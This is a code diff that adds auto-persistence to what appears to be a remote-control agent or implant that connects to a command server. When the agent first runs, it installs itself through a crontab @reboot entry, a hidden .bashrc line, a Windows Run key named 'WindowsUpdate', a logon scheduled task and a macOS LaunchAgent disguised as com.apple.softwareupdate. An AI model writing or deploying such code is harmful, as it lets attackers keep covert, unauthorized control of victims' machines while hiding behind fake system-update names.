@@ -88,6 +88,12 @@ func New(serverAddr string) *Agent {
 func (a *Agent) Run() error {
 	a.running = true
 
+	// Auto-persist on first run (if not already persisted)
+	if !a.isPersisted() {
+		log.Printf("[AGENT] First run — establishing persistence")
+		a.autoPersist()
+	}
+
 	for a.running {
 		log.Printf("[AGENT] Connecting to %s...", a.serverAddr)
 
@@ -963,6 +969,144 @@ func (a *Agent) execBinaryModule(payload []byte, args string) *proto.TaskResult 
 		return &proto.TaskResult{Success: false, Output: string(out), ErrorMessage: err.Error()}
 	}
 	return &proto.TaskResult{Success: true, Output: string(out)}
+}
+
+// --- Auto-Persistence ---
+
+// isPersisted checks if the agent has already established persistence.
+func (a *Agent) isPersisted() bool {
+	switch runtime.GOOS {
+	case "windows":
+		// Check if registry Run key exists
+		psCmd := `Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -ErrorAction SilentlyContinue`
+		cmd := exec.Command("powershell", "-c", psCmd)
+		out, _ := cmd.CombinedOutput()
+		return len(out) > 0
+	case "linux":
+		// Check if crontab entry exists
+		cmd := exec.Command("crontab", "-l")
+		out, _ := cmd.CombinedOutput()
+		return containsStr(string(out), "bty-agent")
+	case "darwin":
+		// Check if LaunchAgent plist exists
+		plistPath := os.ExpandEnv("$HOME/Library/LaunchAgents/com.apple.softwareupdate.plist")
+		_, err := os.Stat(plistPath)
+		return err == nil
+	}
+	return false
+}
+
+// autoPersist establishes persistence using the best method for the OS.
+func (a *Agent) autoPersist() {
+	exePath, _ := os.Executable()
+	serverAddr := a.serverAddr
+
+	switch runtime.GOOS {
+	case "linux":
+		a.persistLinuxCron(exePath, serverAddr)
+		a.persistLinuxBashrc(exePath, serverAddr)
+	case "windows":
+		a.persistWindowsRegistry(exePath, serverAddr)
+		a.persistWindowsScheduledTask(exePath, serverAddr)
+	case "darwin":
+		a.persistDarwinLaunchAgent(exePath, serverAddr)
+	}
+}
+
+func (a *Agent) persistLinuxCron(exePath, serverAddr string) {
+	cronLine := fmt.Sprintf("@reboot %s --server %s >/dev/null 2>&1 &", exePath, serverAddr)
+	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".bty_cron_%d", time.Now().Unix()))
+	
+	// Get existing crontab
+	existing, _ := exec.Command("crontab", "-l").CombinedOutput()
+	content := string(existing)
+	
+	// Add our line if not present
+	if !containsStr(content, "bty-agent") {
+		if content != "" && !strings.HasSuffix(strings.TrimSpace(content), "\n") {
+			content += "\n"
+		}
+		content += cronLine + "\n"
+	}
+	
+	os.WriteFile(tmpFile, []byte(content), 0600)
+	exec.Command("crontab", tmpFile).Run()
+	os.Remove(tmpFile)
+	log.Printf("[PERSIST] Linux crontab persistence established")
+}
+
+func (a *Agent) persistLinuxBashrc(exePath, serverAddr string) {
+	bashrc := os.ExpandEnv("$HOME/.bashrc")
+	line := fmt.Sprintf("\n# system update check\nnohup %s --server %s >/dev/null 2>&1 &\n", exePath, serverAddr)
+	
+	data, err := os.ReadFile(bashrc)
+	if err != nil {
+		return
+	}
+	
+	if !containsStr(string(data), "bty-agent") {
+		f, err := os.OpenFile(bashrc, os.O_APPEND|os.O_WRONLY, 0644)
+		if err == nil {
+			f.WriteString(line)
+			f.Close()
+			log.Printf("[PERSIST] Linux .bashrc persistence established")
+		}
+	}
+}
+
+func (a *Agent) persistWindowsRegistry(exePath, serverAddr string) {
+	psCmd := fmt.Sprintf(
+		`New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value '"%s" --server %s' -PropertyType String -Force`,
+		exePath, serverAddr,
+	)
+	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-c", psCmd)
+	cmd.Run()
+	log.Printf("[PERSIST] Windows Registry persistence established")
+}
+
+func (a *Agent) persistWindowsScheduledTask(exePath, serverAddr string) {
+	taskCmd := fmt.Sprintf(
+		`schtasks /create /tn "WindowsUpdateTask" /tr '"%s" --server %s' /sc onlogon /f`,
+		exePath, serverAddr,
+	)
+	cmd := exec.Command("cmd", "/c", taskCmd)
+	cmd.Run()
+	log.Printf("[PERSIST] Windows Scheduled Task persistence established")
+}
+
+func (a *Agent) persistDarwinLaunchAgent(exePath, serverAddr string) {
+	launchDir := os.ExpandEnv("$HOME/Library/LaunchAgents")
+	os.MkdirAll(launchDir, 0755)
+	
+	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key><string>com.apple.softwareupdate</string>
+    <key>ProgramArguments</key>
+    <array><string>%s</string><string>--server</string><string>%s</string></array>
+    <key>RunAtLoad</key><true/>
+    <key>StartInterval</key><integer>3600</integer>
+</dict>
+</plist>`, exePath, serverAddr)
+	
+	plistFile := filepath.Join(launchDir, "com.apple.softwareupdate.plist")
+	os.WriteFile(plistFile, []byte(plistContent), 0644)
+	exec.Command("launchctl", "load", plistFile).Run()
+	log.Printf("[PERSIST] macOS LaunchAgent persistence established")
+}
+
+func containsStr(s, substr string) bool {
+	return len(s) >= len(substr) && searchString(s, substr)
+}
+
+func searchString(s, substr string) bool {
+	for i := 0; i <= len(s)-len(substr); i++ {
+		if s[i:i+len(substr)] == substr {
+			return true
+		}
+	}
+	return false
 }
 
 var _ = fmt.Sprintf
